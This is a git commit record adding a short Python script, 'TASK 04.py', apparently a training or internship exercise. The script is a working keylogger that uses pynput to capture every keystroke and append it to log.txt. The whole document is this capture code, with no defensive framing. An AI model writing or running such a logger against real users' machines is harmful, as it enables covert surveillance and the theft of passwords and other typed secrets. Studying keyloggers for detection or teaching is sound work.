c6e6f57f22fc60733e8d7b9d3321c1821f8a9d02
DharunRS <ronaldodharun@gmail.com>
2024-06-09 19:44:15 +0530

    Add files via upload

---
+++ TASK 04.py
@@ -0,0 +1,15 @@
+from pynput.keyboard import Listener
+
+def write_to_file(key):
+    letter = str(key)
+    letter = letter.replace("'","")
+
+    if letter == 'Key.space':
+        letter = ' '
+        
+    with open("log.txt", 'a') as f:
+        f.write(letter)
+
+
+with Listener(on_press=write_to_file) as l:
+    l.join()
